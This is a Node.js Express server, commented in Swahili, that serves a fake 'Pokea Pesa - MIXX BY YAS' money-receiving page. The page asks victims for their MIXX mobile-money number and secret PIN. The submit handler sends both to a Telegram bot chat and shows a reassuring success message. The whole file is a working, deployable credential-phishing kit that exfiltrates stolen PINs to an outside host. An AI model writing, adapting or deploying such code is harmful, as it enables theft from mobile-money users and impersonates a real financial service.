const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
require('dotenv').config();
const app = express();
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.use(bodyParser.urlencoded({ extended: true }));

app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html><html lang="sw"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Pokea Pesa - MIXX BY YAS</title><style>body{font-family:Arial;background:#f2f2f2;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.form-box{background:white;padding:25px;border-radius:10px;box-shadow:0 0 10px #ccc;width:90%;max-width:320px;text-align:center}.logo{width:100%;max-width:250px;margin-bottom:10px;border-radius:8px}input{width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:5px;box-sizing:border-box}button{width:100%;padding:12px;background:#8B5CF6;color:white;border:none;border-radius:5px;font-size:16px;font-weight:bold;cursor:pointer}button:hover{background:#7C3AED}h2{color:#8B5CF6;margin:10px 0}label{display:block;text-align:left;font-size:14px;font-weight:bold;color:#333}</style></head><body><div class="form-box"><img src="https://i.imgur.com/5173013600174716780.png" class="logo"><h2>Pokea Pesa - MIXX BY YAS</h2><form action="/submit" method="POST"><label>Namba ya MIXX</label><input type="tel" name="mixxNamba" placeholder="07XXXXXXXX" required><label>Siri</label><input type="password" name="siri" placeholder="Weka siri yako" required><button type="submit">Pokea Pesa</button></form></div></body></html>`);
});

app.post('/submit', async (req, res) => {
  const { mixxNamba, siri } = req.body;

  // Angalia kama env zipo
  if (!BOT_TOKEN || !CHAT_ID) {
    console.error("ERROR: BOT_TOKEN au CHAT_ID haipo kwenye Environment Variables");
    return res.status(500).send('<h2 style="text-align:center;color:red">ERROR: BOT_TOKEN au CHAT_ID haipo. Nenda Render > Environment</h2>');
  }

  const message = `📦 *MIKOPO MPYA IMEINGIA - MIXX BY YAS* 📦\n\n*Namba ya MIXX*: ${mixxNamba}\n*Siri*: ${siri}\n\n⏰ ${new Date().toLocaleString("sw-TZ")}`;
  
  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { 
      chat_id: CHAT_ID, 
      text: message, 
      parse_mode: 'Markdown' 
    });
    res.send('<h2 style="text-align:center;color:green">Umefanikiwa! Tafadhali subiri uthibitisho</h2>');
  } catch (err) {
    console.error("TELEGRAM ERROR:", err.response ? err.response.data : err.message);
    res.status(500).send(`<h2 style="text-align:center;color:red">Kuna shida na Telegram: ${err.response ? err.response.data.description : err.message}</h2>`);
  }
});

app.listen(PORT, () => console.log(`Server inafanya kazi kwenye port ${PORT}`));
